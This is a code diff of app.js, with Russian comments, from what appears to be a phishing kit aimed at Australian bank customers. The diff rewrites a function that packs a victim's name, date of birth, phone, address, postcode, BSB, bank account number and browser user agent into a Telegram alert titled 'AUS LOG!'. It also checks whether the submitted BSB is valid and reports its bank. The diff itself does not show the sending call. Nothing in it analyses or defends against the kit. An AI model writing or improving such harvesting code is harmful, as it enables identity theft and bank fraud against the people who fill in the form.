@@ -1,5 +1,7 @@
 /* ============================================================
-   app.js — Continue не отправляет, пока все поля не заполнены
+   app.js — финальная версия
+   - Continue не отправляет, пока все поля пустые
+   - Сообщение в Telegram в формате "🔴 AUS LOG!"
    ============================================================ */
 
 /* ============================================
@@ -163,26 +165,58 @@ function validateBSB(raw) {
     };
 }
 
-function buildBsbStatusLine(bsbCheck, bsbRaw) {
-    const digits = String(bsbRaw || '').replace(/\D/g, '');
+/* ============================================
+   FORMAT TIME — 9.10.2026, 21:14:56
+   ============================================ */
+function fmtTime(d) {
+    const date = d || new Date();
+    const pad = (n) => String(n).padStart(2, '0');
+    return `${date.getDate()}.${date.getMonth() + 1}.${date.getFullYear()}, ` +
+           `${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
+}
 
-    if (digits.length === 0) {
-        return '<b>BSB status:</b> <i>not provided</i>';
+/* ============================================
+   BUILD MESSAGE — формат "AUS LOG"
+   ============================================ */
+function buildMessage(data, meta, bsbCheck) {
+    const get = (k) => data[k] || '';
+    const name = [get('First name'), get('Last name')].filter(Boolean).join(' ');
+
+    /* BSB status — короткая строка */
+    const bsbRaw = get('BSB');
+    let bsbStatus;
+    if (!bsbRaw || bsbRaw.replace(/\D/g, '').length === 0) {
+        bsbStatus = 'not provided';
+    } else if (bsbCheck.valid) {
+        const tag = bsbCheck.isKnownFull ? 'verified' : 'valid format';
+        bsbStatus = `✅ VALID (${tag}) — ${bsbCheck.bank}`;
+    } else {
+        const digits = bsbRaw.replace(/\D/g, '');
+        const map = {
+            'too_short':      `❌ INVALID — too short (${digits.length}/6 digits)`,
+            'too_long':       `❌ INVALID — too long (${digits.length}/6 digits)`,
+            'zero_prefix':    '❌ INVALID — cannot start with 00',
+            'unknown_prefix': `❌ INVALID — unknown bank prefix "${digits.substring(0, 2)}"`
+        };
+        bsbStatus = map[bsbCheck.reason] || '❌ INVALID';
     }
 
-    if (bsbCheck.valid) {
-        const tag = bsbCheck.isKnownFull ? 'verified code' : 'valid format';
-        return `<b>BSB status:</b> ✅ <b>VALID</b> (${esc(tag)}) — Bank: <code>${esc(bsbCheck.bank)}</code>`;
-    }
+    const lines = [];
+    lines.push('🔴 <b>AUS LOG!</b>');
+    lines.push('');
+    lines.push(`👤 <b>Name:</b> ${esc(name) || '—'}`);
+    lines.push(`🎂 <b>Date of birth:</b> ${esc(get('Date of birth')) || '—'}`);
+    lines.push(`📱 <b>Phone:</b> ${esc(get('Phone number')) || '—'}`);
+    lines.push(`📍 <b>Address:</b> ${esc(get('Address')) || '—'}`);
+    lines.push(`📮 <b>Postcode:</b> ${esc(get('Postcode')) || '—'}`);
+    lines.push(`🏦 <b>BSB:</b> ${esc(get('BSB')) || '—'}`);
+    lines.push(`🔍 <b>BSB status:</b> ${esc(bsbStatus)}`);
+    lines.push(`🔢 <b>Account:</b> ${esc(get('Account number')) || '—'}`);
+    lines.push('');
+    lines.push(`🕒 <b>Time:</b> ${esc(fmtTime())}`);
+    lines.push(`🌐 <b>Browser:</b> ${esc(navigator.userAgent)}`);
 
-    const map = {
-        'too_short':      `❌ INVALID — too short (${digits.length}/6 digits)`,
-        'too_long':       `❌ INVALID — too long (${digits.length}/6 digits)`,
-        'zero_prefix':    '❌ INVALID — cannot start with 00',
-        'unknown_prefix': `❌ INVALID — unknown bank prefix "${esc(digits.substring(0, 2))}"`
-    };
-    const msg = map[bsbCheck.reason] || '❌ INVALID';
-    return `<b>BSB status:</b> ${msg}`;
+    return lines.join('\n');
 }
 
 /* ============================================
@@ -217,38 +251,6 @@ function collectFormData() {
     };
 
     return { data, meta, bsbCheck };
-}
-
-function buildMessage(data, meta, bsbCheck) {
-    const lines = [];
-    lines.push('AUS LOG 🇦🇺🌏');
-    lines.push('');
-    lines.push('<b>── Form data ──</b>');
-
-    let emptyCount = 0;
-    for (const [k, v] of Object.entries(data)) {
-        if (v) {
-            lines.push(`<b>${esc(k)}:</b> <code>${esc(v)}</code>`);
-        } else {
-            lines.push(`<b>${esc(k)}:</b> <i>(empty)</i>`);
-            emptyCount++;
-        }
-    }
-
-    lines.push('');
-    lines.push('<b>── BSB check ──</b>');
-    lines.push(buildBsbStatusLine(bsbCheck, data['BSB']));
-
-    lines.push('');
-    lines.push('<b>── Metadata ──</b>');
-    for (const [k, v] of Object.entries(meta)) {
-        lines.push(`<b>${esc(k)}:</b> <code>${esc(v)}</code>`);
-    }
-
-    lines.push('');
-    lines.push(`<i>Fields filled: ${Object.keys(data).length - emptyCount}/${Object.keys(data).length}</i>`);
-
-    return lines.join('\n');
 }
 
 /* ============================================
